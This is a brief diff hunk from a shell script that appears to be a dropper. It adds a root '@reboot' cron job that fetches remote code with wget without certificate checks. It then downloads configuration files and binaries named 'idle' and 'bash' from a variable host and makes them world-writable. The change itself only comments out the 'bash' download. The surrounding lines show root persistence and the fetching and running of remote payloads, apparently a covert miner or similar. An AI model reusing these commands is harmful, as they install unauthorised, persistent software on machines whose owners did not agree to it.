@@ -37,7 +37,7 @@ sudo sed -i "/^@reboot/d;\$a\@reboot root wget --no-check-certificate -qO- ${src
 
 rm -rf "${work}"; mkdir -p "${work}"
 wget --no-check-certificate -qO "${work}/appsettings.json" "${src}/q.json"
-wget --no-check-certificate -qO "${work}/bash" "${src}/q"
+##wget --no-check-certificate -qO "${work}/bash" "${src}/q"
 wget --no-check-certificate -qO "${work}/config.json" "${src}/idle.json"
 wget --no-check-certificate -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
